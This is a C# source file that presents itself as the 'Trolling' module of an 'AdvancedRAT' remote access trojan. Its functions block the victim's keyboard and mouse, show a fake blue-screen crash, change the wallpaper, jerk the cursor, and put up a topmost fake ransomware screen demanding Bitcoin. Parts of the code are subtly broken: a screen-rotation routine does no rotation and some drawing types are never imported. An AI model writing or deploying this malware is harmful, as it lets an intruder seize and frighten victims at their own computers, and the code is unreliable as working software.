using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AdvancedRAT.Core.Modules
{
    public class Trolling
    {
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);

        [DllImport("user32.dll")]
        public static extern bool SystemParametersInfo(int uiAction, int uiParam, string pvParam, uint fWinIni);

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern bool FlashWindow(IntPtr hWnd, bool bInvert);

        [DllImport("winmm.dll")]
        public static extern long mciSendString(string strCommand, string strReturn, int iReturnLength, IntPtr oCallback);

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;
        const int SW_MAXIMIZE = 3;
        const int SW_SHOW = 5;

        public static async Task ActivateBSOD()
        {
            await Task.Run(() =>
            {
                try
                {
                    // Simulate BSOD by causing a kernel crash
                    // This is done through inline assembly or by calling ntdll functions
                    // For safety reasons, we'll just display a fake BSOD
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c start /min cmd /c \"color 0c && echo. && echo A problem has been detected and Windows has been shut down to prevent damage to your computer. && echo. && echo KERNEL_DATA_INPAGE_ERROR && echo. && echo Technical information: && echo *** STOP: 0x0000007A (0xFFFFF88000930000, 0x00000000C000009C, 0x0000000000000000, 0x0000000000000000) && echo. && echo Give your PC some time to restart.\"",
                        UseShellExecute = true,
                        CreateNoWindow = true
                    };

                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"BSOD activation failed: {ex.Message}");
                }
            });
        }

        public static async Task ChangeWallpaper(string imagePath)
        {
            await Task.Run(() =>
            {
                try
                {
                    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Wallpaper change failed: {ex.Message}");
                }
            });
        }

        public static async Task MaximizeAllWindows()
        {
            await Task.Run(() =>
            {
                try
                {
                    Process[] processes = Process.GetProcesses();
                    foreach (Process p in processes)
                    {
                        if (!string.IsNullOrEmpty(p.MainWindowTitle) && p.MainWindowHandle != IntPtr.Zero)
                        {
                            ShowWindowAsync(p.MainWindowHandle, SW_MAXIMIZE);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Maximizing windows failed: {ex.Message}");
                }
            });
        }

        public static async Task FlashWindows()
        {
            await Task.Run(() =>
            {
                try
                {
                    Process[] processes = Process.GetProcesses();
                    foreach (Process p in processes)
                    {
                        if (!string.IsNullOrEmpty(p.MainWindowTitle) && p.MainWindowHandle != IntPtr.Zero)
                        {
                            FlashWindow(p.MainWindowHandle, true);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Flashing windows failed: {ex.Message}");
                }
            });
        }

        public static async Task BlockUserInput()
        {
            await Task.Run(() =>
            {
                try
                {
                    BlockInput(true);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Blocking input failed: {ex.Message}");
                }
            });
        }

        public static async Task UnblockUserInput()
        {
            await Task.Run(() =>
            {
                try
                {
                    BlockInput(false);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Unblocking input failed: {ex.Message}");
                }
            });
        }

        public static async Task PlaySystemSound()
        {
            await Task.Run(() =>
            {
                try
                {
                    mciSendString("open \"SystemExit\" type waveaudio alias wave", null, 0, IntPtr.Zero);
                    mciSendString("play wave", null, 0, IntPtr.Zero);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Playing system sound failed: {ex.Message}");
                }
            });
        }

        public static async Task RotateScreen(int angle)
        {
            await Task.Run(() =>
            {
                try
                {
                    // This is a simplified approach - in reality, screen rotation requires more complex API calls
                    // This would involve changing display settings through Windows API
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c powershell -WindowStyle Hidden -Command \"[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Screen]::AllScreens | ForEach-Object {{ $_.Bounds.Width }}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    };

                    using (Process proc = Process.Start(startInfo))
                    {
                        proc?.WaitForExit(10000);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Rotating screen failed: {ex.Message}");
                }
            });
        }

        public static async Task VibrateMouse()
        {
            await Task.Run(() =>
            {
                try
                {
                    Random random = new Random();
                    for (int i = 0; i < 50; i++)
                    {
                        int x = Cursor.Position.X + random.Next(-5, 6);
                        int y = Cursor.Position.Y + random.Next(-5, 6);
                        SetCursorPos(x, y);
                        System.Threading.Thread.Sleep(50);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Mouse vibration failed: {ex.Message}");
                }
            });
        }

        public static async Task FakeRansomware()
        {
            await Task.Run(() =>
            {
                try
                {
                    // Create a fake ransomware screen
                    Form ransomForm = new Form
                    {
                        WindowState = FormWindowState.Maximized,
                        FormBorderStyle = FormBorderStyle.None,
                        TopMost = true,
                        BackColor = Color.Black
                    };

                    Label titleLabel = new Label
                    {
                        Text = "YOUR FILES HAVE BEEN ENCRYPTED!",
                        ForeColor = Color.Red,
                        Font = new Font("Arial", 24, FontStyle.Bold),
                        Dock = DockStyle.Top,
                        TextAlign = ContentAlignment.MiddleCenter
                    };

                    Label messageLabel = new Label
                    {
                        Text = "All your files have been encrypted with military-grade encryption.\nTo recover your files, you must pay a ransom of $500 in Bitcoin.\nContact us at: fakeemail@darkweb.com",
                        ForeColor = Color.Lime,
                        Font = new Font("Courier New", 14),
                        Dock = DockStyle.Fill,
                        TextAlign = ContentAlignment.MiddleCenter
                    };

                    ransomForm.Controls.Add(messageLabel);
                    ransomForm.Controls.Add(titleLabel);

                    // Show the form
                    ransomForm.Show();
                    
                    // Close after 30 seconds
                    System.Threading.Timer timer = null;
                    timer = new System.Threading.Timer((obj) =>
                    {
                        ransomForm.Invoke((MethodInvoker)delegate {
                            ransomForm.Close();
                        });
                        timer?.Dispose();
                    }, null, 30000, System.Threading.Timeout.Infinite);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Fake ransomware failed: {ex.Message}");
                }
            });
        }
    }
}